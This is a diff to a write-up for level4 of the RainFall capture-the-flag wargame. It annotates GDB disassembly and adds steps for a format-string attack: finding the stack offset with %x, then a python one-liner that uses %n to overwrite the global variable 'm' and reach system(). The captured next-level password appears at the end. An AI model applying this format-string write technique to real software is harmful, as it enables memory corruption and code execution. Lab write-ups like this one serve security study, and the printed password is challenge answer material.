@@ -30,7 +30,7 @@ Dump of assembler code for function n:
    0x08048485 <+46>:	mov    %eax,(%esp)
    0x08048488 <+49>:	call   0x8048444 <p>
    0x0804848d <+54>:	mov    0x8049810,%eax
-   0x08048492 <+59>:	cmp    $0x1025544,%eax - сравнение с определенным числом
+   0x08048492 <+59>:	cmp    $0x1025544,%eax <<- comparation with number (comand cmp)
    0x08048497 <+64>:	jne    0x80484a5 <n+78>
    0x08048499 <+66>:	movl   $0x8048590,(%esp)
    0x080484a0 <+73>:	call   0x8048360 <system@plt>
@@ -77,6 +77,18 @@ Non-debugging symbols:
 0x0804980c  dtor_idx.6161
 0x08049810  m
 We have global variables
+
+We see where in stack print our string "BBB"
+level4@RainFall:~$ echo "BBBB %x %x %x %x %x %x %x %x %x %x %x %x %x" | ./level4
+BBBB b7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff37d0 42424242 20782520
+And find in twelves' order
+
+"\x10\x98\x04\x08" - address of glob variable 'm'
+"16930112d%12$n" - this is number for compare minus because 4 bytes for address
+When we record number if we will record address it will plus to this number 4.
+%..........d%12$n <- %d is modificator of integer.
+%12$n is mean where to move in place -> 12 in order, %n to rewrite memory. 
+
 Write in to global variable number for comparing minus 4, because 4 bytes for address
 python -c 'print "\x10\x98\x04\x08"+"%16930112d%12$n"' | ./level4
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
